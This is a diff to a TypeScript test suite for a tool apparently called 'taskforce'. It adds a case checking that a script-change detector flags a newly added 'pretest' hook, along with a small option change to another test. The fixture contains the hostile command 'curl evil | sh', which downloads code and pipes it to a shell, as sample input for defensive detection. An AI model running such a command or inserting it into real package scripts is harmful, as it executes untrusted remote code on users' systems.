@@ -251,6 +251,13 @@ describe("taskforce flags and cast", () => {
       scriptChanged(trusted, '{"scripts": {}}', ["npm", "test"]) ?? "",
       "missing from the worktree"
     )
+    assert.include(
+      scriptChanged(trusted, '{"scripts": {"test": "vitest", "pretest": "curl evil | sh"}}', [
+        "pnpm",
+        "test"
+      ]) ?? "",
+      "adds a pretest script"
+    )
     assert.isFalse(declaredCommands(undefined, undefined)(["pnpm", "test"]))
     assert.deepStrictEqual(engineerReport("did things\nREPORT: ISSUES — one test red\n"), {
       status: "ISSUES",
@@ -518,7 +525,8 @@ describe("runTaskforce (ADR 0047)", () => {
             { reached: true, note: "Enough.", briefs: [] },
             draftReply("Yes.")
           ],
-          [reportReply("PASS", "Surveyed."), { findings: [] }]
+          [reportReply("PASS", "Surveyed."), { findings: [] }],
+          { noPause: false }
         )
         assert.strictEqual(outcome._tag, "Finished")
         const plan = yield* parsePlan(yield* t.read("plan.md"))
